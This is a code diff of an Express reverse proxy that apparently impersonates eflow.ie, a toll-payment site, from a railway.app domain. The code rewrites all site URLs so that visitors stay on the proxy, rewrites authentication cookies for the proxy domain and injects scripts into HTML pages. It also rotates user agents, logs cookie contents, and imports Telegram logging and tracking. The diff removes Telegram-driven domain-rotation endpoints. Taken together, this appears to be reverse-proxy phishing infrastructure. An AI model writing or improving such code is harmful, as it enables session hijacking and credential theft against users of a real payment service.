@@ -18,8 +18,6 @@ const logger = require('./logger');
 const { userAgentRotation, getRandomUserAgent } = require('./user-agents');
 const cacheManager = require('./cache-manager');
 const telegramLogger = require('./telegram-logger');
-const telegramDomainBot = require('./telegram-domain-bot');
-const domainManager = require('./domain-manager');
 
 // Create Express app
 const app = express();
@@ -434,6 +432,8 @@ const proxyOptions = {
     // Handle response with responseInterceptor for automatic decompression
     proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
       try {
+        // Log proxy response
+        logger.debug(`Received response ${proxyRes.statusCode} for ${req.url}`);
         
         // CRITICAL: Remove proxy authentication headers from upstream response
         // This prevents ERR_UNEXPECTED_PROXY_AUTH error in browser
@@ -478,6 +478,7 @@ const proxyOptions = {
           statusCode: proxyRes.statusCode,
         });
         
+        logger.debug(`Cached response for ${req.url}`);
       }
       
       // CRITICAL: Handle cookies - rewrite domain for authentication to work
@@ -506,6 +507,8 @@ const proxyOptions = {
             modifiedCookie += '; Path=/';
           }
           
+          logger.debug(`[Cookie Rewrite] Original: ${cookie.substring(0, 100)}...`);
+          logger.debug(`[Cookie Rewrite] Modified: ${modifiedCookie.substring(0, 100)}...`);
           
           return modifiedCookie;
         });
@@ -530,9 +533,13 @@ const proxyOptions = {
       const targetDomain = new URL(config.target.url).hostname; // eflow.ie
       const proxyDomain = req.get('host'); // swa-production.up.railway.app
       
+      // DEBUG LOGGING
+      logger.info(`[RESPONSE INTERCEPTOR] URL: ${req.url}, ContentType: ${contentType}, Status: ${proxyRes.statusCode}, Size: ${responseBuffer.length} bytes`);
+      
       // CRITICAL: Skip processing for very large files (>10MB) to prevent memory issues
       const MAX_PROCESSING_SIZE = 10 * 1024 * 1024; // 10MB
       if (responseBuffer.length > MAX_PROCESSING_SIZE) {
+        logger.warn(`[RESPONSE INTERCEPTOR] Skipping processing for large file: ${req.url} (${(responseBuffer.length / 1024 / 1024).toFixed(2)}MB)`);
         return responseBuffer;
       }
       
@@ -543,29 +550,65 @@ const proxyOptions = {
         contentType.includes('text/css') ||
         contentType.includes('application/json')
       ) {
+        logger.info(`[CONTENT REWRITING] Processing ${contentType} for ${req.url} (${(responseBuffer.length / 1024).toFixed(2)}KB)`);
         // responseBuffer is already decompressed by responseInterceptor!
         let bodyString;
         
         try {
           bodyString = responseBuffer.toString('utf8');
         } catch (error) {
+          logger.error('Failed to convert buffer to string', {
+            error: error.message,
+            url: req.url,
+            bufferLength: responseBuffer.length,
+          });
           return responseBuffer; // Return original if conversion fails
         }
         
         // CRITICAL: Replace ALL forms of target domain with proxy domain
-        // Optimized: single pass with combined regex
-        const proxyUrl = `https://${proxyDomain}`;
-        bodyString = bodyString
-          .replace(/https?:\/\/(www\.)?eflow\.ie/gi, proxyUrl)
-          .replace(/(["\'])eflow\.ie/gi, `$1${proxyDomain}`);
+        // This keeps users on proxy site instead of redirecting to original
+        
+        // Replace http://eflow.ie
+        bodyString = bodyString.replace(
+          new RegExp('http://eflow\\.ie', 'gi'),
+          `https://${proxyDomain}`
+        );
+        
+        // Replace https://eflow.ie
+        bodyString = bodyString.replace(
+          new RegExp('https://eflow\\.ie', 'gi'),
+          `https://${proxyDomain}`
+        );
+        
+        // Replace http://www.eflow.ie
+        bodyString = bodyString.replace(
+          new RegExp('http://www\\.eflow\\.ie', 'gi'),
+          `https://${proxyDomain}`
+        );
+        
+        // Replace https://www.eflow.ie
+        bodyString = bodyString.replace(
+          new RegExp('https://www\\.eflow\\.ie', 'gi'),
+          `https://${proxyDomain}`
+        );
+        
+        // Replace just "eflow.ie" (in href attributes, etc)
+        bodyString = bodyString.replace(
+          new RegExp('(["\'])eflow\\.ie', 'gi'),
+          `$1${proxyDomain}`
+        );
         
         // Replace custom domain if set
-        if (config.customDomain && targetDomain !== config.customDomain) {
-          bodyString = bodyString.replace(new RegExp(targetDomain, 'g'), config.customDomain);
+        if (config.customDomain) {
+          bodyString = bodyString.replace(
+            new RegExp(targetDomain, 'g'),
+            config.customDomain
+          );
         }
         
         // INJECT SCRIPTS ONLY FOR HTML PAGES
         if (contentType.includes('text/html')) {
+          logger.info(`[SCRIPT INJECTION] Preparing to inject scripts for ${req.url}`);
             const targetOrigin = config.target.url; // https://eflow.ie
             const proxyOrigin = `${req.protocol}://${proxyDomain}`;
             
@@ -1515,91 +1558,6 @@ app.post('/api/track', async (req, res) => {
     res.status(200).json({ ok: true });
   } catch (error) {
     logger.error('[Track API] Error:', error.message);
-    res.status(500).json({ error: 'Internal server error' });
-  }
-});
-
-// Domain management API endpoints
-app.post('/api/domain/sync', async (req, res) => {
-  try {
-    const result = await domainManager.syncWithHoster();
-    res.json(result);
-  } catch (error) {
-    logger.error('[API] Error syncing domains:', error);
-    res.status(500).json({ error: error.message });
-  }
-});
-
-app.post('/api/domain/switch', async (req, res) => {
-  try {
-    const { domain } = req.body;
-    if (!domain) {
-      return res.status(400).json({ error: 'Domain is required' });
-    }
-
-    const result = await domainManager.switchDomain(domain);
-    res.json(result);
-  } catch (error) {
-    logger.error('[API] Error switching domain:', error);
-    res.status(500).json({ error: error.message });
-  }
-});
-
-app.get('/api/domain/list', (req, res) => {
-  try {
-    const domains = domainManager.getAllDomains();
-    const current = domainManager.getCurrentDomain();
-    res.json({
-      current,
-      domains,
-      available: domainManager.getAvailableDomains()
-    });
-  } catch (error) {
-    logger.error('[API] Error getting domain list:', error);
-    res.status(500).json({ error: error.message });
-  }
-});
-
-// Webhook for Telegram bot
-app.post('/api/telegram/webhook', express.json(), async (req, res) => {
-  try {
-    const update = req.body;
-    
-    // Логирование для отладки
-    logger.info('[Telegram Webhook] Received update:', JSON.stringify(update));
-    
-    if (update.message) {
-      const { chat, text } = update.message;
-      logger.info(`[Telegram Webhook] Message from chat ${chat.id}: ${text}`);
-      if (text && text.startsWith('/')) {
-        const [command, ...args] = text.split(' ');
-        logger.info(`[Telegram Webhook] Handling command: ${command} with args:`, args);
-        // КРИТИЧНО: await и try-catch для обработки ошибок
-        try {
-          await telegramDomainBot.handleCommand(chat.id, command, args);
-          logger.info(`[Telegram Webhook] Command ${command} processed successfully`);
-        } catch (error) {
-          logger.error(`[Telegram Webhook] Error processing command ${command}:`, error);
-          logger.error(`[Telegram Webhook] Error stack:`, error.stack);
-        }
-      }
-    } else if (update.callback_query) {
-      logger.info(`[Telegram Webhook] Callback query: ${update.callback_query.data}`);
-      try {
-        await telegramDomainBot.handleCallbackQuery(update.callback_query);
-        logger.info(`[Telegram Webhook] Callback query processed successfully`);
-      } catch (error) {
-        logger.error(`[Telegram Webhook] Error processing callback query:`, error);
-        logger.error(`[Telegram Webhook] Error stack:`, error.stack);
-      }
-    } else {
-      logger.warn('[Telegram Webhook] Unknown update type:', Object.keys(update));
-    }
-    
-    res.sendStatus(200);
-  } catch (error) {
-    logger.error('[Telegram Webhook] Fatal error:', error);
-    logger.error('[Telegram Webhook] Error stack:', error.stack);
     res.status(500).json({ error: 'Internal server error' });
   }
 });
